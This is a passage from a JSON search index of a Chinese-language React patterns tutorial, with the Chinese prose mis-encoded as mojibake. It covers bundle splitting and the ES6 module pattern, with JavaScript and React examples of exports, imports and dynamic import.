çš„å·¨å¤§æ†ç»‘åŒ…ï¼\né€šè¿‡å¯¹åº”ç”¨ç¨‹åºè¿›è¡Œæ†ç»‘æ‹†åˆ†ï¼Œ\nå¯ä»¥å‡å°‘åŠ è½½ã€å¤„ç†å’Œæ‰§è¡Œæ†ç»‘æ‰€éœ€çš„æ—¶é—´ï¼ é€šè¿‡å‡å°‘åŠ è½½å’Œæ‰§è¡Œæ—¶é—´ï¼Œå¯ä»¥å‡å°‘åœ¨ç”¨æˆ·å±å¹•ä¸Šç»˜åˆ¶ç¬¬ä¸€ä¸ªå†…å®¹ä¹‹å‰æ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œ\nå³ First Contentful Paintï¼Œä»¥åŠå°†æœ€å¤§ç»„ä»¶æ¸²æŸ“åˆ°å±å¹•ä¹‹å‰æ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œå³ Largest å†…å®¹ä¸°å¯Œçš„æ²¹æ¼†ã€‚\nè™½ç„¶èƒ½å¤Ÿåœ¨å±å¹•ä¸Šçœ‹åˆ°æ•°æ®å¾ˆæ£’ï¼Œä½†ä¸åªæ˜¯æƒ³çœ‹åˆ°å†…å®¹ã€‚ ä¸ºäº†æ‹¥æœ‰ä¸€ä¸ªåŠŸèƒ½é½å…¨çš„åº”ç”¨ç¨‹åºï¼Œå¸Œæœ›ç”¨æˆ·ä¹Ÿèƒ½å¤Ÿä¸ä¹‹äº¤äº’ï¼ ç”¨æˆ·ç•Œé¢åªæœ‰åœ¨åŒ…è¢«åŠ è½½å’Œæ‰§è¡Œåæ‰å˜å¾—äº¤äº’ã€‚ å°†æ‰€æœ‰å†…å®¹ç»˜åˆ¶åˆ°å±å¹•ä¸Šå¹¶è¿›è¡Œäº¤äº’ä¹‹å‰æ‰€éœ€çš„æ—¶é—´ç§°ä¸ºäº¤äº’æ—¶é—´ã€‚\næ›´å¤§çš„åŒ…å¹¶ä¸ä¸€å®šæ„å‘³ç€æ›´é•¿çš„æ‰§è¡Œæ—¶é—´ã€‚ æœ‰å¯èƒ½æˆ‘ä»¬åŠ è½½äº†å¤§é‡ç”¨æˆ·ç”šè‡³ä¸ä¼šä½¿ç”¨çš„ä»£ç ï¼ ä¹Ÿè®¸æ†ç»‘åŒ…çš„æŸäº›éƒ¨åˆ†åªä¼šåœ¨ç‰¹å®šçš„ç”¨æˆ·äº¤äº’ä¸­æ‰§è¡Œï¼Œç”¨æˆ·å¯èƒ½ä¼šä¹Ÿå¯èƒ½ä¸ä¼šè¿™æ ·åšï¼\nåœ¨ç”¨æˆ·èƒ½å¤Ÿåœ¨å±å¹•ä¸Šçœ‹åˆ°ä»»ä½•å†…å®¹ä¹‹å‰ï¼Œå¼•æ“ä»ç„¶å¿…é¡»åŠ è½½ã€è§£æå’Œç¼–è¯‘åœ¨åˆå§‹æ¸²æŸ“ä¸­ç”šè‡³æ²¡æœ‰ä½¿ç”¨çš„ä»£ç ã€‚ å°½ç®¡ç”±äºæµè§ˆå™¨å¤„ç†è¿™ä¸¤ä¸ªæ­¥éª¤çš„é«˜æ•ˆæ–¹å¼ï¼Œè§£æå’Œç¼–è¯‘æˆæœ¬å®é™…ä¸Šå¯ä»¥è¢«å¿½ç•¥ï¼Œä½†è·å–æ¯”å¿…è¦æ›´å¤§çš„åŒ…å¯èƒ½ä¼šæŸå®³åº”ç”¨ç¨‹åºçš„æ€§èƒ½ã€‚ ä½ç«¯è®¾å¤‡æˆ–é€Ÿåº¦è¾ƒæ…¢çš„ç½‘ç»œä¸Šçš„ç”¨æˆ·ä¼šåœ¨è·å–æ†ç»‘åŒ…ä¹‹å‰çœ‹åˆ°åŠ è½½æ—¶é—´æ˜¾ç€å¢åŠ ã€‚\nç¬¬ä¸€éƒ¨åˆ†ä»ç„¶éœ€è¦åŠ è½½å’Œå¤„ç†ï¼Œå³ä½¿å¼•æ“åªä½¿ç”¨æ–‡ä»¶çš„æœ€åä¸€éƒ¨åˆ†ä»¥ä¾¿æˆ‘ä»¬å¯ä»¥å°†è¿™äº›ä»£ç ä¸å‘ˆç°åˆå§‹é¡µé¢æ‰€éœ€çš„ä»£ç åˆ†å¼€ï¼Œ\nè€Œä¸æ˜¯æœ€åˆè¯·æ±‚åœ¨å½“å‰å¯¼èˆªä¸­æ²¡æœ‰é«˜ä¼˜å…ˆçº§çš„éƒ¨åˆ†ä»£ç ã€‚\né€šè¿‡å°†å¤§åŒ…æ‹†åˆ†æˆä¸¤ä¸ªè¾ƒå°çš„åŒ…ï¼Œmain.bundle.js å’Œ emoji-picker.bundle.jsï¼Œé€šè¿‡è·å–æ›´å°‘é‡çš„æ•°æ®æ¥å‡å°‘åˆå§‹åŠ è½½æ—¶é—´ã€‚\nåœ¨è¿™ä¸ªç« èŠ‚ä¸­ï¼Œä»‹ç»äº†ä¸€äº›æ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•å…è®¸å°†åº”ç”¨ç¨‹åºæ†ç»‘æ‹†åˆ†æˆå¤šä¸ªè¾ƒå°çš„æ†ç»‘åŒ…ï¼Œå¹¶ä»¥æœ€æœ‰æ•ˆå’Œæ€§èƒ½æœ€å¥½çš„æ–¹å¼åŠ è½½èµ„æºã€‚\n\rçŸ¥è¯†ç‚¹    ","description":"å°†ä»£ç æ‹†åˆ†ä¸ºå¯é‡å¤ä½¿ç”¨çš„å°å—","id":106,"section":"react-patterns","tags":null,"title":"æ†ç»‘æ‹†åˆ†","uri":"https://codthing.github.io/react-patterns/performance-patterns/bundle-splitting/"},{"content":"éšç€åº”ç”¨ç¨‹åºå’Œä»£ç åº“çš„å¢é•¿ï¼Œä¿æŒä»£ç çš„å¯ç»´æŠ¤æ€§å’Œåˆ†ç¦»æ€§å˜å¾—è¶Šæ¥è¶Šé‡è¦ã€‚ æ¨¡å—æ¨¡å¼å°†ä»£ç æ‹†åˆ†ä¸ºæ›´å°çš„ã€å¯é‡ç”¨çš„éƒ¨åˆ†ã€‚\né™¤äº†èƒ½å¤Ÿå°†ä»£ç æ‹†åˆ†ä¸ºæ›´å°çš„å¯é‡ç”¨éƒ¨åˆ†ä¹‹å¤–ï¼Œæ¨¡å—è¿˜å…è®¸æ‚¨å°†æ–‡ä»¶ä¸­çš„æŸäº›å€¼ä¿å¯†ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¨¡å—å†…çš„å£°æ˜èŒƒå›´ï¼ˆå°è£…ï¼‰åˆ°è¯¥æ¨¡å—ã€‚ å¦‚æœæˆ‘ä»¬ä¸æ˜ç¡®å¯¼å‡ºæŸä¸ªå€¼ï¼Œåˆ™è¯¥å€¼åœ¨è¯¥æ¨¡å—ä¹‹å¤–ä¸å¯ç”¨ã€‚ è¿™é™ä½äº†ä»£ç åº“å…¶ä»–éƒ¨åˆ†ä¸­å£°æ˜çš„å€¼å‘ç”Ÿåç§°å†²çªçš„é£é™©ï¼Œå› ä¸ºè¿™äº›å€¼åœ¨å…¨å±€èŒƒå›´å†…ä¸å¯ç”¨ã€‚\n\rES6 Modules ES2015 å¼•å…¥äº†å†…ç½®çš„ JavaScript æ¨¡å—ã€‚ æ¨¡å—æ˜¯ä¸€ä¸ªåŒ…å« JavaScript ä»£ç çš„æ–‡ä»¶ï¼Œä¸æ™®é€šè„šæœ¬ç›¸æ¯”ï¼Œåœ¨è¡Œä¸ºä¸Šæœ‰ä¸€äº›ä¸åŒã€‚\nè®©æˆ‘ä»¬çœ‹ä¸€ä¸ªåä¸º math.js çš„æ¨¡å—çš„ç¤ºä¾‹ï¼Œå…¶ä¸­åŒ…å«æ•°å­¦å‡½æ•°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  //math.js function add(x, y) { return x + y; } function multiply(x) { return x * 2; } function subtract(x, y) { return x - y; } function square(x) { return x * x; }   æˆ‘ä»¬æœ‰ä¸€ä¸ªåŒ…å«ä¸€äº›ç®€å•æ•°å­¦é€»è¾‘çš„ math.js æ–‡ä»¶ã€‚æˆ‘ä»¬æœ‰ä¸€äº›å‡½æ•°å…è®¸ç”¨æˆ·åŠ ã€ä¹˜ã€å‡å’Œå¾—åˆ°ä»–ä»¬ä¼ é€’çš„å€¼çš„å¹³æ–¹ã€‚\nç„¶è€Œï¼Œæˆ‘ä»¬ä¸åªæ˜¯æƒ³åœ¨ math.js æ–‡ä»¶ä¸­ä½¿ç”¨è¿™äº›å‡½æ•°ï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿåœ¨ index.js æ–‡ä»¶ä¸­å¼•ç”¨å®ƒä»¬ï¼\nç›®å‰ï¼Œåœ¨ index.js æ–‡ä»¶ä¸­æŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼šåœ¨ index.js æ–‡ä»¶ä¸­æ²¡æœ‰ç§°ä¸ºåŠ ã€å‡ã€ä¹˜æˆ–å¹³æ–¹çš„å‡½æ•°ã€‚\næˆ‘ä»¬æ­£åœ¨å°è¯•å¼•ç”¨ index.js æ–‡ä»¶ä¸­ä¸å¯ç”¨çš„å‡½æ•°ã€‚\n1 2 3 4 5 6 7  //index.js  console.log(add(2, 3)); //ReferenceError: add is not defined console.log(multiply(2)); //ReferenceError: multiply is not defined console.log(subtract(2, 3)); //ReferenceError: subtract is not defined console.log(square(2)); //ReferenceError: square is not defined   ä¸ºäº†ä½¿ math.js ä¸­çš„å‡½æ•°å¯ç”¨äºå…¶ä»–æ–‡ä»¶ï¼Œæˆ‘ä»¬é¦–å…ˆå¿…é¡»å¯¼å‡ºå®ƒä»¬ã€‚\nä¸ºäº†ä»æ¨¡å—ä¸­å¯¼å‡ºä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ export å…³é”®å­—ã€‚\nå¯¼å‡ºå‡½æ•°çš„ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨å‘½åå¯¼å‡ºï¼šæˆ‘ä»¬å¯ä»¥ç®€å•åœ°åœ¨è¦å…¬å¼€çš„éƒ¨åˆ†å‰é¢æ·»åŠ  export å…³é”®å­—ã€‚\nåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›åœ¨æ¯ä¸ªå‡½æ•°å‰æ·»åŠ  export å…³é”®å­—ï¼Œå› ä¸º index.js åº”è¯¥å¯ä»¥è®¿é—®æ‰€æœ‰å››ä¸ªå‡½æ•°ã€‚\nexport function add(x, y) {\rreturn x + y;\r}\rexport function multiply(x) {\rreturn x * 2;\r}\rexport function subtract(x, y) {\rreturn x - y;\r}\rexport function square(x) {\rreturn x * x;\r} æˆ‘ä»¬åˆšåˆšä½¿åŠ ã€ä¹˜ã€å‡å’Œå¹³æ–¹å‡½æ•°å¯å¯¼å‡ºï¼ ä½†æ˜¯ï¼Œä»…ä»æ¨¡å—ä¸­å¯¼å‡ºå€¼ä¸è¶³ä»¥ä½¿å®ƒä»¬å¯¹æ‰€æœ‰æ–‡ä»¶å…¬å¼€å¯ç”¨ã€‚\nä¸ºäº†èƒ½å¤Ÿä½¿ç”¨ä»æ¨¡å—å¯¼å‡ºçš„å€¼ï¼Œå¿…é¡»åœ¨éœ€è¦å¼•ç”¨å®ƒä»¬çš„æ–‡ä»¶ä¸­æ˜¾å¼å¯¼å…¥å®ƒä»¬ã€‚\nå¿…é¡»ä½¿ç”¨ import å…³é”®å­—åœ¨ index.js æ–‡ä»¶é¡¶éƒ¨å¼•ç”¨å€¼ã€‚\nä¸ºäº†è®© javascript çŸ¥é“æˆ‘ä»¬æƒ³è¦ä»å“ªä¸ªæ¨¡å—å¯¼å…¥è¿™äº›å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦æ·»åŠ ä¸€ä¸ª from å€¼å’Œæ¨¡å—çš„ç›¸å¯¹è·¯å¾„ã€‚\nimport { add, multiply, subtract, square } from \u0026#34;./math.js\u0026#34;; æˆ‘ä»¬åˆšåˆšä» index.js æ–‡ä»¶ä¸­çš„ math.js æ¨¡å—å¯¼å…¥äº†å››ä¸ªå‡½æ•°ï¼ è®©æˆ‘ä»¬è¯•è¯•çœ‹æˆ‘ä»¬ç°åœ¨æ˜¯å¦å¯ä»¥ä½¿ç”¨è¿™äº›åŠŸèƒ½ï¼\n1 2 3 4 5 6 7 8  //index.js import { add, multiply, subtract, square } from \u0026#34;./math\u0026#34;; console.log(add(2, 3)); //5 console.log(multiply(2)); //4 console.log(subtract(2, 3)); //-1 console.log(square(2)); //4   å¼•ç”¨é”™è¯¯æ¶ˆå¤±äº†ï¼Œç°åœ¨å¯ä»¥ä½¿ç”¨ä»æ¨¡å—å¯¼å‡ºçš„å€¼ï¼\næ‹¥æœ‰æ¨¡å—çš„ä¸€å¤§å¥½å¤„æ˜¯æˆ‘ä»¬åªèƒ½è®¿é—®ä½¿ç”¨ export å…³é”®å­—æ˜¾å¼å¯¼å‡ºçš„å€¼ã€‚æ²¡æœ‰ä½¿ç”¨ export å…³é”®å­—æ˜¾å¼å¯¼å‡ºçš„å€¼ä»…åœ¨è¯¥æ¨¡å—ä¸­å¯ç”¨ã€‚\nè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåªèƒ½åœ¨ math.js æ–‡ä»¶ä¸­å¼•ç”¨çš„å€¼ï¼Œç§°ä¸º privateValueã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  //math.js const privateValue = \u0026#34;è¿™æ˜¯æ¨¡å—ç§æœ‰çš„å€¼ï¼\u0026#34;; export function add(x, y) { return x + y; } export function multiply(x) { return x * 2; } export function subtract(x, y) { return x - y; } export function square(x) { return x * x; }   è¯·æ³¨æ„æˆ‘ä»¬æ²¡æœ‰åœ¨ privateValue å‰é¢æ·»åŠ  export å…³é”®å­—ã€‚ ç”±äºæ²¡æœ‰å¯¼å‡º privateValue å˜é‡ï¼Œæ‰€ä»¥æ— æ³•åœ¨ math.js æ¨¡å—ä¹‹å¤–è®¿é—®è¿™ä¸ªå€¼ï¼\n1 2 3 4 5 6  //index.js import { add, multiply, subtract, square } from \u0026#34;./math.js\u0026#34;; console.log(privateValue); /* Error: privateValue is not defined */   é€šè¿‡ä¿æŒæ¨¡å—çš„ç§æœ‰å€¼ï¼Œé™ä½äº†æ„å¤–æ±¡æŸ“å…¨å±€èŒƒå›´çš„é£é™©ã€‚ ä¸å¿…æ‹…å¿ƒå¼€å‘äººå‘˜æ„å¤–è¦†ç›–æ‚¨çš„æ¨¡å—åˆ›å»ºçš„å€¼ï¼Œè¿™äº›å€¼å¯èƒ½ä¸æ‚¨çš„ç§æœ‰å€¼å…·æœ‰ç›¸åŒçš„åç§°ï¼šå®ƒå¯ä»¥é˜²æ­¢å‘½åå†²çªã€‚\næœ‰æ—¶ï¼Œå¯¼å‡ºçš„åç§°å¯èƒ½ä¼šä¸æœ¬åœ°å€¼å‘ç”Ÿå†²çªã€‚\n1 2 3 4 5 6 7 8 9 10 11  import { add, multiply, subtract, square } from \u0026#34;./math.js\u0026#34;; function add(...args) { return args.reduce((acc, cur) =\u0026gt; cur + acc); } /* Error: add å·²ç»è¢«å£°æ˜ */ function multiply(...args) { return args.reduce((acc, cur) =\u0026gt; cur * acc); } /* Error: multiply å·²ç»è¢«å£°æ˜ */   åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åœ¨ index.js ä¸­æœ‰åä¸º add å’Œ multiply çš„å‡½æ•°ã€‚ å¦‚æœæˆ‘ä»¬å¯¼å…¥åŒåçš„å€¼ï¼Œæœ€ç»ˆä¼šå‘ç”Ÿå‘½åå†²çªï¼šadd å’Œ multiply å·²ç»è¢«å£°æ˜äº†ï¼\nå¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ as å…³é”®å­— é‡å‘½åå¯¼å…¥çš„å€¼ã€‚\nè®©æˆ‘ä»¬å°†å¯¼å…¥çš„åŠ æ³•å’Œä¹˜æ³•å‡½æ•°é‡å‘½åä¸º addValues å’Œ multiplyValuesã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  import { add as addValues, multiply as multiplyValues, subtract, square } from \u0026#34;./math.js\u0026#34;; function add(...args) { return args.reduce((acc, cur) =\u0026gt; cur + acc); } function multiply(...args) { return args.reduce((acc, cur) =\u0026gt; cur * acc); } /* From math.js module */ addValues(7, 8); multiplyValues(8, 9); subtract(10, 3); square(3); /* From index.js file */ add(8, 9, 2, 10); multiply(8, 9, 2, 10);   é™¤äº†å‘½åå¯¼å‡ºï¼ˆä»…ä½¿ç”¨ export å…³é”®å­—å®šä¹‰çš„å¯¼å‡ºï¼‰ä¹‹å¤–ï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨é»˜è®¤å¯¼å‡ºã€‚ æ¯ä¸ªæ¨¡å—åªèƒ½æœ‰ä¸€ä¸ªé»˜è®¤å¯¼å‡ºã€‚\nè®©æˆ‘ä»¬å°† add å‡½æ•°è®¾ä¸ºæˆ‘ä»¬çš„é»˜è®¤å¯¼å‡ºï¼Œå¹¶å°†å…¶ä»–å‡½æ•°ä¿ç•™ä¸ºå‘½åå¯¼å‡ºã€‚\næˆ‘ä»¬å¯ä»¥å¯¼å‡ºä¸€ä¸ªé»˜è®¤å€¼ï¼Œé€šè¿‡åœ¨å€¼å‰é¢æ·»åŠ å¯¼å‡ºé»˜è®¤å€¼ã€‚\nexport default function add(x, y) {\rreturn x + y;\r}\rexport function multiply(x) {\rreturn x * 2;\r}\rexport function subtract(x, y) {\rreturn x - y;\r}\rexport function square(x) {\rreturn x * x;\r} å‘½åå¯¼å‡ºå’Œé»˜è®¤å¯¼å‡ºä¹‹é—´çš„åŒºåˆ«åœ¨äºä»æ¨¡å—å¯¼å‡ºå€¼çš„æ–¹å¼ï¼Œæœ‰æ•ˆåœ°æ”¹å˜å¯¼å…¥å€¼çš„æ–¹å¼ã€‚\nä»¥å‰ï¼Œ\n æˆ‘ä»¬å¿…é¡»ä¸ºå‘½åå¯¼å‡ºä½¿ç”¨æ–¹æ‹¬å·ï¼š import { module } from \u0026lsquo;module\u0026rsquo;ã€‚ ä½¿ç”¨é»˜è®¤å¯¼å‡ºï¼Œæˆ‘ä»¬å¯ä»¥å¯¼å…¥ä¸å¸¦æ‹¬å·çš„å€¼ï¼š import module from \u0026lsquo;module\u0026rsquo;  import add, { multiply, subtract, square } from \u0026#34;./math.js\u0026#34;;\radd(7, 8);\rmultiply(8, 9);\rsubtract(10, 3);\rsquare(3); å¦‚æœæœ‰å¯ç”¨çš„é»˜è®¤å¯¼å‡ºï¼Œåˆ™ä»ä¸å¸¦æ‹¬å·çš„æ¨¡å—å¯¼å…¥çš„å€¼å§‹ç»ˆæ˜¯é»˜è®¤å¯¼å‡ºçš„å€¼ã€‚\nç”±äº JavaScript çŸ¥é“è¯¥å€¼å§‹ç»ˆæ˜¯é»˜è®¤å¯¼å‡ºçš„å€¼ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¸ºå¯¼å…¥çš„é»˜è®¤å€¼æŒ‡å®šå¦ä¸€ä¸ªåç§°ï¼Œè€Œä¸æ˜¯å¯¼å‡ºæ—¶ä½¿ç”¨çš„åç§°ã€‚\nä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç§°ä¸º addValuesï¼Œè€Œä¸æ˜¯ä½¿ç”¨åç§° add å¯¼å…¥ add å‡½æ•°ã€‚\nimport addValues, { multiply, subtract, square } from \u0026#34;./math.js\u0026#34;;\raddValues(7, 8);\rmultiply(8, 9);\rsubtract(10, 3);\rsquare(3); å³ä½¿å¯¼å‡ºäº†åä¸º add çš„å‡½æ•°ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†å…¶å¯¼å…¥å¹¶è°ƒç”¨ä»»ä½•æˆ‘ä»¬å–œæ¬¢çš„åç§°ï¼Œå› ä¸º JavaScript çŸ¥é“æ‚¨æ­£åœ¨å¯¼å…¥é»˜è®¤å¯¼å‡ºã€‚\nè¿˜å¯ä»¥é€šè¿‡ä½¿ç”¨æ˜Ÿå· * å¹¶ç»™å‡ºæˆ‘ä»¬å¸Œæœ›å°†æ¨¡å—å¯¼å…¥çš„åç§°ï¼Œä»æ¨¡å—å¯¼å…¥æ‰€æœ‰å¯¼å‡ºï¼Œå³æ‰€æœ‰å‘½åå¯¼å‡ºå’Œé»˜è®¤å¯¼å‡ºã€‚\nå¯¼å…¥çš„å€¼ç­‰äºä¸€ä¸ªåŒ…å«æ‰€æœ‰å¯¼å…¥å€¼çš„å¯¹è±¡ã€‚ å‡è®¾æˆ‘æƒ³å°†æ•´ä¸ªæ¨¡å—ä½œä¸ºæ•°å­¦å¯¼å…¥ã€‚\nimport * as math from \u0026#34;./math.js\u0026#34;; å¯¼å…¥çš„å€¼æ˜¯ math å¯¹è±¡çš„å±æ€§ã€‚\nimport * as math from \u0026#34;./math.js\u0026#34;;\rmath.default(7, 8);\rmath.multiply(8, 9);\rmath.subtract(10, 3);\rmath.square(3); åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä»ä¸€ä¸ªæ¨¡å—å¯¼å…¥æ‰€æœ‰å¯¼å‡ºã€‚ æ‰§è¡Œæ­¤æ“ä½œæ—¶è¦å°å¿ƒï¼Œå› ä¸ºæ‚¨æœ€ç»ˆå¯èƒ½ä¼šå¯¼å…¥ä¸å¿…è¦çš„å€¼ã€‚\nä½¿ç”¨ * ä»…å¯¼å…¥æ‰€æœ‰å¯¼å‡ºçš„å€¼ã€‚ æ¨¡å—ç§æœ‰çš„å€¼åœ¨å¯¼å…¥æ¨¡å—çš„æ–‡ä»¶ä¸­ä»ç„¶ä¸å¯ç”¨ï¼Œé™¤éæ‚¨æ˜ç¡®å¯¼å‡ºå®ƒä»¬ã€‚\n\rReact ä½¿ç”¨ React æ„å»ºåº”ç”¨ç¨‹åºæ—¶ï¼Œæ‚¨ç»å¸¸éœ€è¦å¤„ç†å¤§é‡ç»„ä»¶ã€‚ ä¸æ˜¯å°†æ‰€æœ‰è¿™äº›ç»„ä»¶éƒ½å†™åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™äº›ç»„ä»¶åˆ†å¼€åœ¨å®ƒä»¬è‡ªå·±çš„æ–‡ä»¶ä¸­ï¼Œæœ¬è´¨ä¸Šä¸ºæ¯ä¸ªç»„ä»¶åˆ›å»ºä¸€ä¸ªæ¨¡å—ã€‚\næˆ‘ä»¬æœ‰ä¸€ä¸ªåŸºæœ¬çš„å¾…åŠäº‹é¡¹åˆ—è¡¨ï¼ŒåŒ…å«ä¸€ä¸ªåˆ—è¡¨ listã€åˆ—è¡¨é¡¹ list itemsã€ä¸€ä¸ªè¾“å…¥å­—æ®µ input fieldå’Œä¸€ä¸ªæŒ‰é’® buttonã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  //Button.js import React from \u0026#34;react\u0026#34;; import Button from \u0026#34;@material-ui/core/Button\u0026#34;; const style = { root: { borderRadius: 3, border: 0, color: \u0026#34;white\u0026#34;, margin: \u0026#34;0 20px\u0026#34; }, primary: { background: \u0026#34;linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)\u0026#34; }, secondary: { background: \u0026#34;linear-gradient(45deg, #2196f3 30%, #21cbf3 90%)\u0026#34; } }; export default function CustomButton(props) { return ( \u0026lt;Button {...props} style={{ ...style.root, ...style[props.color] }}\u0026gt; {props.children} \u0026lt;/Button\u0026gt; ); }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  //Input.js import React from \u0026#34;react\u0026#34;; import Input from \u0026#34;@material-ui/core/Input\u0026#34;; const style = { root: { padding: \u0026#34;5px\u0026#34;, backgroundColor: \u0026#34;#434343\u0026#34;, color: \u0026#34;#fff\u0026#34; } }; export default function CustomInput(props, { variant = \u0026#34;standard\u0026#34; }) { return ( \u0026lt;Input style={style.root} {...props} variant={variant} placeholder=\u0026#34;Type...\u0026#34; /\u0026gt; ); }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55  //TodoList.js import React, { useState } from \u0026#34;react\u0026#34;; import { List, ListItem, ListItemText } from \u0026#34;@material-ui/core\u0026#34;; import Input from \u0026#34;./Input\u0026#34;; import Button from \u0026#34;./Button\u0026#34;; function InputRow({ addTodoItem }) { const [input, setInput] = useState(\u0026#34;\u0026#34;); function addTodo() { addTodoItem(input); setInput(\u0026#34;\u0026#34;); } return ( \u0026lt;form\u0026gt; \u0026lt;Input value={input} onChange={(e) =\u0026gt; setInput(e.target.value)} /\u0026gt; \u0026lt;Button onClick={addTodo} color=\u0026#34;primary\u0026#34; variant=\u0026#34;outlined\u0026#34;\u0026gt; Add Item \u0026lt;/Button\u0026gt; \u0026lt;/form\u0026gt; ); } export function TodoList() { const [todos, setTodos] = useState([\u0026#34;Improve JS skills ğŸ’ª\u0026#34;, \u0026#34;Pet dog ğŸ¶\u0026#34;]); function addTodoItem(todo) { todo.length \u0026amp;\u0026amp; setTodos([...todos, todo]); } function removeTodoItem(i) { todos.splice(i, 1); setTodos([...todos]); } return ( \u0026lt;div className=\u0026#34;todo-list\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Todo Items\u0026lt;/h1\u0026gt; \u0026lt;InputRow addTodoItem={addTodoItem} /\u0026gt; \u0026lt;List\u0026gt; {todos.map((todo, i) =\u0026gt; ( \u0026lt;ListItem key={`${todo}-${i}`}\u0026gt; \u0026lt;ListItemText\u0026gt;{todo}\u0026lt;/ListItemText\u0026gt; \u0026lt;Button color=\u0026#34;secondary\u0026#34; onClick={() =\u0026gt; removeTodoItem(i)}\u0026gt; Remove \u0026lt;/Button\u0026gt; \u0026lt;/ListItem\u0026gt; ))} \u0026lt;/List\u0026gt; \u0026lt;/div\u0026gt; ); }   æˆ‘ä»¬åªæ˜¯å°†ç»„ä»¶æ‹†åˆ†åˆ°å•ç‹¬çš„æ–‡ä»¶ä¸­ï¼š\n åˆ—è¡¨ç»„ä»¶çš„ TodoList.js Button.js ç”¨äºè‡ªå®šä¹‰ Button ç»„ä»¶ Input.js ç”¨äºè‡ªå®šä¹‰ Input ç»„ä»¶ã€‚  åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­ï¼Œæˆ‘ä»¬ä¸æƒ³ä½¿ç”¨ä» material-ui åº“å¯¼å…¥çš„é»˜è®¤ Button å’Œ Input ç»„ä»¶ã€‚ ç›¸åï¼Œæˆ‘ä»¬æƒ³è¦ä½¿ç”¨æˆ‘ä»¬çš„è‡ªå®šä¹‰ç‰ˆæœ¬çš„ç»„ä»¶ï¼Œé€šè¿‡å‘å…¶æ·»åŠ è‡ªå®šä¹‰æ ·å¼ï¼Œåœ¨å®ƒä»¬çš„æ–‡ä»¶ä¸­çš„æ ·å¼å¯¹è±¡ä¸­å®šä¹‰ã€‚ ä¸å…¶åœ¨æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºä¸­æ¯æ¬¡éƒ½å¯¼å…¥é»˜è®¤çš„ Button å’Œ Input ç»„ä»¶å¹¶ä¸€éåˆä¸€éåœ°å‘å…¶æ·»åŠ è‡ªå®šä¹‰æ ·å¼ï¼Œ\nä¸å¦‚ç®€å•åœ°å¯¼å…¥ä¸€æ¬¡é»˜è®¤çš„ Button å’Œ Input ç»„ä»¶ï¼Œæ·»åŠ æ ·å¼ï¼Œç„¶åå¯¼å‡ºæˆ‘ä»¬çš„è‡ªå®šä¹‰ç»„ä»¶ã€‚\nè¯·æ³¨æ„æˆ‘ä»¬å¦‚ä½•åœ¨ Button.js å’Œ Input.js ä¸­éƒ½æœ‰ä¸€ä¸ªåä¸º style çš„å¯¹è±¡ã€‚ ç”±äºæ­¤å€¼æ˜¯æ¨¡å—èŒƒå›´çš„ï¼Œæˆ‘ä»¬å¯ä»¥é‡ç”¨å˜é‡åç§°è€Œä¸ä¼šå†’åç§°å†²çªçš„é£é™©ã€‚\n\råŠ¨æ€å¯¼å…¥ å½“åœ¨æ–‡ä»¶é¡¶éƒ¨å¯¼å…¥æ‰€æœ‰æ¨¡å—æ—¶ï¼Œæ‰€æœ‰æ¨¡å—éƒ½ä¼šåœ¨æ–‡ä»¶çš„å…¶ä½™éƒ¨åˆ†ä¹‹å‰åŠ è½½ã€‚ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåªéœ€è¦æ ¹æ®æŸä¸ªæ¡ä»¶å¯¼å…¥ä¸€ä¸ªæ¨¡å—ã€‚ é€šè¿‡åŠ¨æ€å¯¼å…¥ï¼Œå¯ä»¥æŒ‰éœ€å¯¼å…¥æ¨¡å—ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12  import(\u0026#34;module\u0026#34;).then(module =\u0026gt; { module.default(); module.namedExport(); }); // Or with async/await (async () =\u0026gt; { const module = await import(\u0026#34;module\u0026#34;); module.default(); module.namedExport(); })();   è®©æˆ‘ä»¬åŠ¨æ€å¯¼å…¥å‰é¢æ®µè½ä¸­ä½¿ç”¨çš„ math.js ç¤ºä¾‹ã€‚\nè¯¥æ¨¡å—ä»…åœ¨ç”¨æˆ·å•å‡»æŒ‰é’®æ—¶åŠ è½½ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  const button = document.getElementById(\u0026#34;btn\u0026#34;); button.addEventListener(\u0026#34;click\u0026#34;, () =\u0026gt; { import(\u0026#34;./math.js\u0026#34;).then((module) =\u0026gt; { console.log(\u0026#34;Add: \u0026#34;, module.add(1, 2)); 